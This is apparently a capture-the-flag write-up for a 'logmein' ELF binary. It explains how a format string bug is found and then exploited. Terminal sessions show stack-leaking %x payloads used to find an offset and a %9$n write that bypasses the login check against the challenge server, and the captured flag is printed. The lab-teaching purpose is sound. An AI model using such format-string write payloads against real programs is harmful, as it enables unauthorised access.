So we are given a 64 bit ELF file. Let’s run it and see what it does.

```
./logmein
user = 0x1734260
Enter your username:
guy
Enter password for user: guy
tux
Invalid login information.
```


So we are given what looks like to be a value for a user. Proceeding that we are prompted for a username (which it prints out), and a password. Let’s take a look in ida to see if we can find a bug to hack our way to a successful authentication. 
From looking at the disassembly and the pseudo code we can spot of a format string bug. Essentially the program takes user defined data, and prints it out without proper checks and safeguards. Using this we can actually read, and write to various locations on the stack (depending on how locked down the binary is). Now looking down further the pseudocode we will have to pass an if then statement to get the flag. In order to pass that if then statement, we will have to somehow exploit the code to change the value being evaluated. We will do this through a Format String Exploit.
In order to exploit this, we will need to find the offset between where we can input data, and where the value we are editing is. It gives us the value in the beginning, so we don’t have to figure that out, although it is randomly generated upon each instance of the program so we can’t just look for it easily with ida or assembly. In order to find this, we can just use the Format String Vulnerability to spit out values off of the stack until we find the value. Once find the value we will know the offset. Below is an example of a format string attack. The “%” designates that it is a format, the “5” designates that the offset is 5, and the “$x” designates that we are reading the value as hex. By the way with this program, if you try to read more than 4 values off of the stack you will just overflow the program for the next if then statement, and it will close.

```
./logmein
user = 0x12d8260
Enter your username:
%x.%2$x.%3$x.%4$x
Enter password for user: 3e134790.8bed6780.8bc07a10.8c2d9700
nope
Invalid login information.
```

The value we’re trying to overload doesn’t appear to be in the first four. Let’s keep on looking.

```
./logmein
user = 0xf04260
Enter your username:
%5$x.%6$x.%7$x.%8$x
Enter password for user: 19.c9a5fb10.0.0Invalid login information.
```

Doesn’t appear to be here, let’s keep on looking for a little bit

```
./logmein
user = 0x154e260
Enter your username:
%9$x.%10$x.%11$x.%12$x
Enter password for user: 154e260.aabfde40.392599ea.%1Invalid login information.
```

And we found it. It is in the ninth spot after our input get’s printed. Now that we know that, we can just overwrite that value. We will do this with the following string. Essentially it’s the same thing as reading a data from the stack, except the offset is nine and instead of “x” for read as a hex, we will be putting “n” to write to that value.

```
nc ctf.hackucf.org 7006
user = 0x10e9010
Enter your username:
guy %9$n
Enter password for user: guy
say my name
Successfully logged in!
flag{why_does_printf_even_have_%n}
```

And just like that, we pwned the binary







 

